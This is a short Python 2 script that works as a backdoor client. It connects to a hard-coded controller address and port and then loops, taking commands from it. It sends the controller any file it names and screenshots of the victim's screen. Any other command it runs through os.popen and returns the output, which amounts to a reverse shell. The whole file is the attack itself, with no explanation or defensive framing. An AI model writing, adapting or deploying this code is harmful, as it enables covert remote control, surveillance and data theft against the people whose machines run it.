import socket, os, numpy as np, pyautogui, imutils, cv2
from random import randint

HOST = "192.168.2.50"
PORT = 1234

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((HOST,PORT))

    s.send("CMD NOW OPEN")

    s.close()

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        cmd = s.recv(1024)
        print cmd

        if "rb.filetrans" in cmd:
            loc = cmd.split(" ")
            print loc
            f = open(os.path.join(loc[2], loc[1]),"rb")
            l = f.read(1024)
            while l:
                s.send(l)
                l = f.read(1024)
            f.close()
            s.close()

        if "rb.screenshot" in cmd:
            string = "scrsht_" + str(randint(1000,9999)) + ".png"
            pyautogui.screenshot(string)
            f = open(string)
            l = f.read(1024)
            while l:
                s.send(l)
                l = f.read(1024)
            f.close()
            s.close()

        else:
            ret = os.popen(str(cmd)).readlines()
            output = ""
            for thing in ret:
                output += thing
            print output
            s.send(output)
            s.close()


except ValueError:
    "something went wrong"
    s.close()